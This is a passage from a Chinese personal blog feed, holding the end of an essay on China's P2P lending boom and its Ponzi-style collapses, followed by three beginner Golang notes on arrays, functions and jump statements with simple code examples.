<p>　　为何金融机构小微贷款难一直无法解决？主要还是因为中小微企业的信贷调查成本、操作成本及过高的不良率导致的银行实际净收益下降，让银行失去了投放的动力。银行更愿意把钱贷给政府投资搞基建，或者贷给买房的人啊。你想想，政府的信用多高啊，贷给政府的资金风险小，实在搞砸了政府也不会倒闭，开着印钞机印钱就可以缓解问题啊。另外，贷给买房的人风险也不高，毕竟房价要下跌几乎不可能。如果房价下跌，那贷款买房的人就有可能不再还房贷了，有可能导致银行崩盘，政府肯定不会让这样的事情发生。因此，只要房价不下跌，那么银行放出去的房贷的收入就比较稳定。然后你再想想，贷给中小微企业，本来经济就不景气，这风险多高。说不定哪天企业就倒闭了，那么不良率就会升高，银行收入也就会打折扣。</p>
<p>　　所以说，P2P金融还是有很大的需求。P2P金融模式的积极意义：</p>
<ul>
<li>有闲散资金的投资人能够通过P2P金融平台找到合适的有资金需求的人，获得比银行存款更高的收益；</li>
<li>有资金需求人或者企业在P2P平台可以方便快捷地完成借款申请、查看进度以及归还借款等操作，极大提高融资效率；</li>
<li>对国家和社会来说，P2P模式提高了资金利用率，遏制了高利贷的滋生和蔓延，有利于经济发展和社会稳定。</li>
</ul>
<p>　　有人说，P2P整体来看还是值得投资的，解决了普惠金融的实质，真正的为那些融资难的普惠人群解决燃眉之急，也给广大的投资人提供一种能获得稳定收益的固收类理财方式。但是，现实情况来看，肯定现在不是合适的时候。</p>
<p>　　P2P 贷款在欧美国家，已是“非银行借贷”的主流方式。P2P金融也早就进入中国，但正真兴起是在2014年政府提出“大众创业，万众创新”之后。一时之间，P2P金融像大跃进一样在各大城市火爆开展，各种名目繁多的理财产品推向市场，各种奇奇怪怪的P2P平台遍地开花，开出的薪资水平都高得吓人。</p>
<p>　　对于P2P金融公司来说，它就是一个平台，本身并不碰钱，你要借钱给谁，多少利息，都是你自己决定，风险也是自己担，它靠收取一定的交易手续费和服务费实现盈利。可是P2P金融在国内却被玩坏了。由于没有有效的监管措施，在我国P2P门槛低，吹牛不犯法，所以短时间内就可以吸引大量用户，人多自然钱就来了，很多P2P公司成立之初也正是看重了这一点，他们做P2P更像是监管投机，而不是做大了赚交易手续费啥的。<strong>于是，很多公司玩起了借新还旧(即庞氏骗局):</strong> </p>
<p>　　由于利息高，P2P平台可以很快筹集到很多想理财的资金，这个时候会有两种情况：一是想借钱的人没有那么多，所以，没有把钱借出去，所以就形成了很多资金堆压在自己的平台，换言之是很多钱在平台自己的手上，我们称为资金池。二是，由于平台需要支付给用户的利息高，那么筹集资金的成本也就会很高，那么放贷的利息也就会很高。也就是说，一般只有那种从正规低成本渠道（银行）贷不出钱的，靠着资金借新还旧续命的企业或者个人才会去借着样的钱，所以这样借出去的钱风险会特别高。</p>
<p>　　对于第一种情况，一旦平台的钱积累到一定的数目，那么会玩的平台就开始拿资金池里的钱付前面钱的利息，因为只要后面的钱源源不断的进来，那么前面的钱一直就会有利息拿，而且这个利息很高。对于第二种情况，一旦很多借出去的钱最后都还不了，平台就会像第一种情况那样后面的钱去支付前面的钱所需要的利息。但是，不管怎么看，在老百姓看来，这平台挺好的，钱放里面啥也不用干，一年能拿个百分之十几的利息，所以也不会着急去取。</p>
<p>　　但是，问题来了。 一旦资金达到一个规模，后面的钱填不上前面的利息，或者出现前面的钱开始有人在取的时候，那么资金池里的钱会越来越少，最后就会出现资金链断裂，断裂之后会引发大量的出金赎回，又形成了更大的断裂。 所以，到最后平台发现玩崩了，撑不下去就只能跑路了。</p>
<p>　　暑假回家，与朋友交流，发现我们那五六线的小县城都开始搞P2P金融了。朋友说，当时身边很多人都投了，收入十分可观啊，大家都觉得觉得不买的才是傻子啊，每天稳赚，收益比存银行高多了。但是，后来平台倒了，血本无归啊。</p>
<p>　　近期P2P平台大量暴雷，跑路、停业、提现困难，今年倒闭停业的P2P机构清单令人触目惊心。据不完全统计，自6月起至今的50天内，大约有212家网贷平台出现跑路失联、平台停业、主动退出、提现困难等情况，平均每天发生问题的平台多达4.24家。以每个平台5000个投资人估计，受害人多达百万之众。另外，根据统计，仅7月份（7月2日—7月16日），就有131家网贷平台暴雷，很多规模非常大的网贷平台，就这样轰然倒下，让投资人都难以相信。</p>
<p>　　前面也说到，其实P2P金融还是有它存在的价值，只要国家能够加强监管力度，使其发挥积极的作用，那对于国家、社会甚至是个人都是有益处的。也相信，经过这几年的清洗和沉淀，这个行业会越来越成熟，也还是会有投资的价值。</p>
<p>　　最近看到一篇文章，P2P平台大量暴雷后，那么多公司的员工去哪了？调查发现，大部分都去了区块链公司，很多P2P金融初创公司由于无法完成备案都转型做区块链了。话说，这两年的币圈确实也是火得不行啊，颇有当年P2P金融的势头。但是，P2P得今天会不会是区块链的明天呢？下次有时间再聊聊区块链。</p>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title>Golang 笔记-数组</title>
    <url>/2018/08/25/Golang%20%E7%AC%94%E8%AE%B0-%E6%95%B0%E7%BB%84/</url>
    <content><![CDATA[<center>Golang 数组学习</center>

<a id="more"></a>
<h4 id="一维数组"><a href="#一维数组" class="headerlink" title="一维数组"></a>一维数组</h4><p>　　数组占用的内存是连续的，因此CPU能把正在使用的数据缓存更久的时间，而且更容易计算索引，可以快速迭代数组里的所有元素。数组是具有相同 <strong>唯一类型</strong> 的一组已编号且长度固定的数据项序列。数组长度也是数组类型的一部分，所以[5]int和[10]int是属于不同类型的。</p>
<h5 id="声明与初始化"><a href="#声明与初始化" class="headerlink" title="声明与初始化"></a>声明与初始化</h5><p>　　数组中元素的类型是相同的，每个元素是通过索引来访问的，索引从0到数组长度减1。声明格式：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> identifier [<span class="built_in">len</span>]<span class="keyword">type</span></div></pre></td></tr></table></figure>
<p>　　例如声明一个整型数组，声明时所有的元素都会被自动初始化为默认值 0 ：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> array [<span class="number">6</span>]<span class="keyword">int</span>	<span class="comment">// 默认初始值为0</span></div></pre></td></tr></table></figure>
<p>　　也可以在声明的同时初始化指定值：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> array = [<span class="number">6</span>]<span class="keyword">int</span>&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;	<span class="comment">// 定义同时初始化，只初始化前3个值</span></div></pre></td></tr></table></figure>
<p>　　使用简写方式声明并初始化指定值：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line">array := [<span class="number">6</span>]<span class="keyword">int</span>&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;	<span class="comment">// := 简写</span></div></pre></td></tr></table></figure>
<p>　　让 Go 语言自动计算声明数组的长度：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line">array := [...]<span class="keyword">int</span>&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;	<span class="comment">// 省略长度，又由初始值的个数决定</span></div></pre></td></tr></table></figure>
<p>　　声明的同时初始化指定元素的值：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line">array := [<span class="number">6</span>]<span class="keyword">int</span>&#123;<span class="number">1</span>: <span class="number">10</span>, <span class="number">3</span>: <span class="number">20</span>&#125;	<span class="comment">// 初始化指定索引的值，其它保持为0</span></div></pre></td></tr></table></figure>
<p>　　Go内置的函数len可以返回数组中的元素个数。 </p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> array [<span class="number">6</span>]<span class="keyword">int</span></div><div class="line">fmt.Println(<span class="built_in">len</span>(array))	<span class="comment">// 输出为6</span></div></pre></td></tr></table></figure>
<p>　　Go 语言中的数组是一种 <strong>值类型</strong>（不像 C/C++ 中是指向首元素的指针），所以也可以使用 <code>new()</code> 来创建数组，此方法返回一个指向数组的指针：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line">array := <span class="built_in">new</span>([<span class="number">6</span>]<span class="keyword">int</span>)</div></pre></td></tr></table></figure>
<p>　　另外，数组之间可以使用 <code>==</code> 或 <code>!=</code> 进行比较，但不可以使用 <code>&lt;</code> 或 <code>&gt;</code> 。 </p>
<h5 id="赋值与迭代"><a href="#赋值与迭代" class="headerlink" title="赋值与迭代"></a>赋值与迭代</h5><p>　　声明后按索引为数组元素赋值：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> array [<span class="number">6</span>]<span class="keyword">int</span></div><div class="line">array[<span class="number">0</span>] = <span class="number">1</span>	<span class="comment">// 按索引赋值</span></div></pre></td></tr></table></figure>
<p>　　使用 <code>for range</code> 迭代数组：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">for</span> i, v := <span class="keyword">range</span> array&#123;	</div><div class="line">    <span class="comment">// 输出索引和值，i代表索引, v代表索引位置对应的值</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">for</span> _, v := <span class="keyword">range</span> array&#123;</div><div class="line">    <span class="comment">// 仅输出值，不要使用索引时用下划线</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="数组指针与指针数组"><a href="#数组指针与指针数组" class="headerlink" title="数组指针与指针数组"></a>数组指针与指针数组</h5><ul>
<li><strong>数组指针</strong>：数组指针可以说成是”数组的指针”，首先这个变量是一个指针，其次，”数组”修饰这个指针，意思是说这个指针存放着一个数组的首地址，或者说这个指针指向一个数组的首地址。 </li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line">array := [<span class="number">3</span>]<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</div><div class="line"><span class="keyword">var</span> arr = &amp;array</div><div class="line">fmt.Println(arr[<span class="number">0</span>])	<span class="comment">// 输出1</span></div></pre></td></tr></table></figure>
<ul>
<li><strong>指针数组</strong>：指针数组可以说成是”指针的数组”，首先这个变量是一个数组，其次，”指针”修饰这个数组，意思是说这个数组的所有元素都是指针类型，在32位系统中，指针占四个字节。 </li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> a, b, c = <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span></div><div class="line">array := [<span class="number">3</span>]*<span class="keyword">int</span>&#123;&amp;a, &amp;b, &amp;c&#125;</div><div class="line">fmt.Println(*array[<span class="number">0</span>])	<span class="comment">// 输出1</span></div></pre></td></tr></table></figure>
<h4 id="多维数组"><a href="#多维数组" class="headerlink" title="多维数组"></a>多维数组</h4><p>　　二维数组是最简单的多维数组，二维数组本质上是由一维数组组成的。二维数组定义方式如下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> identifier [x][y]<span class="keyword">type</span></div></pre></td></tr></table></figure>
<p>　　示例：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line">array := [<span class="number">2</span>][<span class="number">3</span>]<span class="keyword">int</span>&#123;&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;, &#123;<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>&#125;&#125; <span class="comment">// 二维数组，2行3列</span></div><div class="line">fmt.Println(array)</div><div class="line">fmt.Println(array[<span class="number">0</span>])</div><div class="line">fmt.Println(array[<span class="number">0</span>][<span class="number">0</span>])</div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">[[1 2 3] [4 5 6]]</div><div class="line">[1 2 3]</div><div class="line">1</div></pre></td></tr></table></figure>
<h4 id="传递数组给函数"><a href="#传递数组给函数" class="headerlink" title="传递数组给函数"></a>传递数组给函数</h4><h5 id="值传递"><a href="#值传递" class="headerlink" title="值传递"></a>值传递</h5><p>　　使用值传递的例子：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">	array := [<span class="number">3</span>]<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</div><div class="line">	x := sum(array)</div><div class="line">	fmt.Println(x)</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">sum</span><span class="params">(arr [3]<span class="keyword">int</span>)</span> <span class="params">(sum <span class="keyword">int</span>)</span></span> &#123;</div><div class="line">	<span class="keyword">for</span> _, v := <span class="keyword">range</span> arr &#123;</div><div class="line">		sum += v</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　但是，如果我们的数组非常大，每次调用函数都是值传递的话，那么每次都必须在栈上分配很大内存，造成不必要的内存消耗。</p>
<h5 id="引用传递"><a href="#引用传递" class="headerlink" title="引用传递"></a>引用传递</h5><p>　　如上所属，把一个大数组传递给函数会消耗很多内存。可以使用引用传递来避免这种现象，可以传递数组的指针，也可以使用数组的切片。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">	array := [<span class="number">3</span>]<span class="keyword">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</div><div class="line">	x := sum(&amp;array)	<span class="comment">// 传递数组的地址</span></div><div class="line">	fmt.Println(x)</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">sum</span><span class="params">(arr *[3]<span class="keyword">int</span>)</span> <span class="params">(sum <span class="keyword">int</span>)</span></span> &#123;	<span class="comment">// 参数为指针</span></div><div class="line">	<span class="keyword">for</span> _, v := <span class="keyword">range</span> arr &#123;</div><div class="line">		sum += v</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Coding</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title>Golang 笔记-函数</title>
    <url>/2018/08/25/Golang%20%E7%AC%94%E8%AE%B0-%E5%87%BD%E6%95%B0/</url>
    <content><![CDATA[<center>Golang 函数学习</center>

<a id="more"></a> 
<h4 id="定义与声明"><a href="#定义与声明" class="headerlink" title="定义与声明"></a>定义与声明</h4><p>　　函数是基本的代码块。Go 是编译型语言，所以函数编写的顺序是无关紧要的；鉴于可读性的需求，最好把 <code>main()</code> 函数写在文件的前面，其他函数按照一定逻辑顺序进行编写（例如函数被调用的顺序）。 Go 语言函数定义格式如下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">function_name</span><span class="params">( [parameter list] )</span> [<span class="title">return_types</span>]</span></div><div class="line">&#123;</div><div class="line">   <span class="comment">// 函数体</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　函数由关键字 <code>func</code> 开始声明，参数列表指定的是参数类型、顺序、及参数个数。参数是可选的，也就是说函数也可以不包含参数。返回类型，函数返回一列值。return_types 是该列值的数据类型。例如：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">sum</span><span class="params">(a <span class="keyword">int</span>, b <span class="keyword">int</span>)</span> <span class="title">int</span></span>&#123;</div><div class="line">	<span class="keyword">return</span> a + b</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　Go 里面有三种类型的函数：</p>
<ul>
<li>普通的带有名字的函数</li>
<li>匿名函数或者lambda函数（后续博客介绍）</li>
<li>方法（后续博客介绍）</li>
</ul>
<p>　　函数被调用的基本格式如下： </p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line">pack.Function(arg1, arg2, …, argn)</div></pre></td></tr></table></figure>
<p>　　其中，Function 是 pack 包中的函数，括号里的是被调用函数的实参。同文件内函数调用不要加包名。</p>
<p>　　<strong>注意</strong>：函数重载指的是可以编写多个同名函数，只要它们拥有不同的形参与/或者不同的返回值，在 Go 里面函数重载是不被允许的。</p>
<h4 id="参数与返回值"><a href="#参数与返回值" class="headerlink" title="参数与返回值"></a>参数与返回值</h4><p>　　除了main()、init()函数外，其它所有类型的函数都可以有参数与返回值。</p>
<h5 id="参数列表"><a href="#参数列表" class="headerlink" title="参数列表"></a>参数列表</h5><p>　　函数如果使用参数，该变量可称为函数的形参。形参就像定义在函数体内的局部变量。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">sum</span><span class="params">(a <span class="keyword">int</span>, b <span class="keyword">int</span>)</span> <span class="title">int</span></span>&#123;</div><div class="line">	<span class="keyword">return</span> a + b</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　参数类型相同的情况：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">sum</span><span class="params">(a, b <span class="keyword">int</span>)</span> <span class="title">int</span></span>&#123;</div><div class="line">	<span class="keyword">return</span> a + b</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　可变长参数：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">	<span class="keyword">var</span> x, y, z = <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span></div><div class="line">	a := sum(x)</div><div class="line">	b := sum(x, y)</div><div class="line">	c := sum(x, y, z)</div><div class="line">	fmt.Println(a, b, c) <span class="comment">// 输出1 3 6</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">sum</span><span class="params">(a ...<span class="keyword">int</span>)</span> <span class="params">(sum <span class="keyword">int</span>)</span></span> &#123;	<span class="comment">// 使用可变长参数</span></div><div class="line">	<span class="keyword">for</span> _, v := <span class="keyword">range</span> a &#123;	<span class="comment">// 使用for range迭代可变长参数</span></div><div class="line">		sum += v</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="值传递"><a href="#值传递" class="headerlink" title="值传递"></a>值传递</h5><p>　　Go 默认使用按值传递来传递参数，也就是传递参数的副本。函数接收参数副本之后，在使用变量的过程中可能对副本的值进行更改，但不会影响到原来的变量。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">	<span class="keyword">var</span> x, y = <span class="number">1</span>, <span class="number">2</span></div><div class="line">	a, b := exchange(x, y) <span class="comment">// 传值</span></div><div class="line">	fmt.Println(a, b)      <span class="comment">// 输出2, 1</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">exchange</span><span class="params">(a, b <span class="keyword">int</span>)</span> <span class="params">(x, y <span class="keyword">int</span>)</span></span> &#123;</div><div class="line">	x, y = b, a</div><div class="line">	<span class="keyword">return</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h5 id="引用传递"><a href="#引用传递" class="headerlink" title="引用传递"></a>引用传递</h5><p>　　如果需要直接修改参数的值，而不是对参数的副本进行操作，你需要将参数的地址（变量名前面添加 <code>&amp;</code> 符号）传递给函数，这就是按引用传递。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">	<span class="keyword">var</span> x, y = <span class="number">1</span>, <span class="number">2</span></div><div class="line">	exchange(&amp;x, &amp;y)  <span class="comment">// 传地址</span></div><div class="line">	fmt.Println(x, y) <span class="comment">// 输出2 1</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">exchange</span><span class="params">(a, b *<span class="keyword">int</span>)</span></span> &#123;</div><div class="line">	<span class="comment">// 由于传入的是地址，所以如果在函数内修改a,b的值，x,y的值也会改变</span></div><div class="line">	*a, *b = *b, *a</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　传递指针给函数不但可以节省内存（因为没有复制变量的值），而且赋予了函数直接修改外部变量的能力，所以被修改的变量不再需要使用 <code>return</code> 返回。<strong>几乎在任何情况下，传递指针（一个32位或者64位的值）的消耗都比传递副本来得少。</strong> （具体案例将在后续博客中介绍）</p>
<h5 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h5><p>　　有返回值的函数，一般必须有明确的 <code>return</code> 语句。返回值可命名也可不命名，命名的返回值和参数一样可以当作局部变量使用。例如：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">sum</span><span class="params">(a, b <span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</div><div class="line">	<span class="keyword">return</span> a + b</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　返回值命名后，<code>return</code> 可以写成显式也可以隐式。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">sum</span><span class="params">(a, b <span class="keyword">int</span>)</span> <span class="params">(z <span class="keyword">int</span>)</span></span> &#123;</div><div class="line">	z = a + b</div><div class="line">	<span class="keyword">return</span> z	<span class="comment">// 显式</span></div><div class="line">    <span class="comment">// return 也可以没有z 隐式返回</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　Go 语言可以返回零个或多个值，相比与 C、C++、Java 和 C#，多值返回是 Go 的一大特性，为我们判断一个函数是否正常执行提供了方便。Go 语言的函数经常使用两个返回值来表示执行是否成功：返回某个值以及 <code>true</code> 表示成功；返回零值（或 <code>nil</code>）和 <code>false</code> 表示失败。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> orig <span class="keyword">string</span> = <span class="string">"ABC"</span></div><div class="line"><span class="comment">// var orig string	// 会发生错误</span></div><div class="line">an, err := strconv.Atoi(orig)</div><div class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;	<span class="comment">// 判断是否转换成功</span></div><div class="line">	fmt.Printf(<span class="string">"orig %s is not an integer - exiting with error\n"</span>, orig)</div><div class="line">	<span class="keyword">return</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　如上，我们使用 <code>strconv</code> 包中的 <code>Atoi</code> 函数将一个字符串转换为一个整数，如果转换成功则 <code>err</code> 返回 <code>nil</code> 否则返回具体的错误类型。那么我们就可以通过判断 <code>err</code> ，如果确实存在错误，则会打印相应的错误信息然后通过 return 提前结束函数的执行。</p>
<h4 id="defer"><a href="#defer" class="headerlink" title="defer"></a>defer</h4><p>　　关键字 <code>defer</code> 允许我们推迟到函数返回之前（或任意位置执行 <code>return</code> 语句之后）一刻才执行某个语句或函数。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">	<span class="keyword">defer</span> fmt.Println(<span class="string">"world"</span>)</div><div class="line">	fmt.Println(<span class="string">"Hello"</span>)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">Hello</div><div class="line">world</div></pre></td></tr></table></figure>
<p>　　关键字 <code>defer</code> 允许我们进行一些函数执行完成后的收尾工作，一般用于释放某些已分配的资源：</p>
<ul>
<li>关闭文件流</li>
<li>解锁一个加锁的资源</li>
<li>关闭数据库连接</li>
<li>……</li>
</ul>
<p>　　当有多个 defer 行为被注册时，它们会以逆序执行（类似栈，即后进先出）：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">5</span>; i++ &#123;</div><div class="line">	<span class="keyword">defer</span> fmt.Printf(<span class="string">"%d "</span>, i)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">4 3 2 1 0</div></pre></td></tr></table></figure>
<h4 id="内置函数"><a href="#内置函数" class="headerlink" title="内置函数"></a>内置函数</h4><p>　　Go 语言拥有一些不需要进行导入操作就可以使用的内置函数：</p>
<table>
<thead>
<tr>
<th>名称</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>close</td>
<td>用于管道通信</td>
</tr>
<tr>
<td>len、cap</td>
<td>len 用于返回某个类型的长度或数量（字符串、数组、切片、map 和管道）；cap 是容量的意思，用于返回某个类型的最大容量（只能用于切片和 map）</td>
</tr>
<tr>
<td>new、make</td>
<td>new 和 make 均是用于分配内存：new 用于值类型和用户定义的类型，如自定义结构，make 用于内置引用类型（切片、map 和管道）。它们的用法就像是函数，但是将类型作为参数：new(type)、make(type)。new(T) 分配类型 T 的零值并返回其地址，也就是指向类型 T 的指针。它也可以被用于基本类型：<code>v := new(int)</code>。make(T) 返回类型 T 的初始化之后的值，因此它比 new 进行更多的工作<strong>new() 是一个函数，不要忘记它的括号</strong></td>
</tr>
<tr>
<td>copy、append</td>
<td>用于复制和连接切片</td>
</tr>
<tr>
<td>panic、recover</td>
<td>两者均用于错误处理机制</td>
</tr>
<tr>
<td>print、println</td>
<td>底层打印函数，在部署环境中建议使用 fmt 包</td>
</tr>
<tr>
<td>complex、real imag</td>
<td>用于创建和操作复数</td>
</tr>
</tbody>
</table>
]]></content>
      <categories>
        <category>Coding</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title>Golang 笔记-跳转</title>
    <url>/2018/08/23/Golang%20%E7%AC%94%E8%AE%B0-%E8%B7%B3%E8%BD%AC/</url>
    <content><![CDATA[<center> Golang 跳转学习。</center>

<a id="more"></a>
<h4 id="break-与-continue"><a href="#break-与-continue" class="headerlink" title="break 与 continue"></a>break 与 continue</h4><h5 id="break"><a href="#break" class="headerlink" title="break"></a>break</h5><p>　　<code>break</code> 的作用范围为该语句出现后的最内部的结构，它可以被用于任何形式的 <code>for</code> 循环（计数器、条件判断等）。但在 <code>switch</code> 或 <code>select</code> 语句中，<code>break</code> 语句的作用结果是跳过整个代码块，执行后续的代码。</p>
<p>　　<code>break</code> 只会退出最内层的循环： </p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">3</span>; i++ &#123;</div><div class="line">    <span class="keyword">for</span> j := <span class="number">0</span>; j &lt; <span class="number">8</span>; j++ &#123;</div><div class="line">        <span class="keyword">if</span> j &gt; <span class="number">4</span> &#123;</div><div class="line">        	<span class="keyword">break</span></div><div class="line">        &#125;</div><div class="line">        fmt.Print(j)</div><div class="line">    &#125;</div><div class="line">    fmt.Println(<span class="string">""</span>)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">01234</div><div class="line">01234</div><div class="line">01234</div></pre></td></tr></table></figure>
<h5 id="continue"><a href="#continue" class="headerlink" title="continue"></a>continue</h5><p>　　关键字 <code>continue</code> 忽略剩余的循环体而直接进入下一次循环的过程，但不是无条件执行下一次循环，执行之前依旧需要满足循环的判断条件。 注意：<code>continue</code> 关键字只能用在 <code>for</code> 循环中。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</div><div class="line">    <span class="keyword">if</span> i == <span class="number">5</span> &#123;</div><div class="line">    	<span class="keyword">continue</span></div><div class="line">    &#125;</div><div class="line">    fmt.Print(i)</div><div class="line">    fmt.Print(<span class="string">" "</span>)</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">0 1 2 3 4 6 7 8 9</div></pre></td></tr></table></figure>
<h4 id="label-与-goto"><a href="#label-与-goto" class="headerlink" title="label 与 goto"></a>label 与 goto</h4><p>　　<code>for、switch</code> 或 <code>select</code> 语句都可以配合标签（<code>LABEL</code>）形式的标识符使用，即某一行第一个以冒号（:）结尾的单词（<code>gofmt</code> 会将后续代码自动移至下一行）。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><div class="line"><span class="comment">// LABEL: 标签放在这里会造成死循环</span></div><div class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">3</span>; i++ &#123;</div><div class="line">		<span class="keyword">for</span> j := <span class="number">0</span>; j &lt; <span class="number">8</span>; j++ &#123;</div><div class="line">			<span class="keyword">if</span> j &gt; <span class="number">4</span> &#123;</div><div class="line">				<span class="keyword">goto</span> LABEL</div><div class="line">			&#125;</div><div class="line">			fmt.Print(j)</div><div class="line">		&#125;</div><div class="line">		fmt.Println(<span class="string">""</span>)</div><div class="line">	&#125;</div><div class="line">LABEL:</div><div class="line">	fmt.Println(<span class="string">"\nLABEL......"</span>)</div></pre></td></tr></table></figure>
<p>　　输出结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">01234</div><div class="line">LABEL......</div></pre></td></tr></table></figure>
<p>　　<code>goto LABEL</code>的 <code>LABEL</code> (标签) 既可以定义在for循环前面，也可以定义在for循环后面，当跳转到标签地方时，继续执行标签下面的代码。</p>
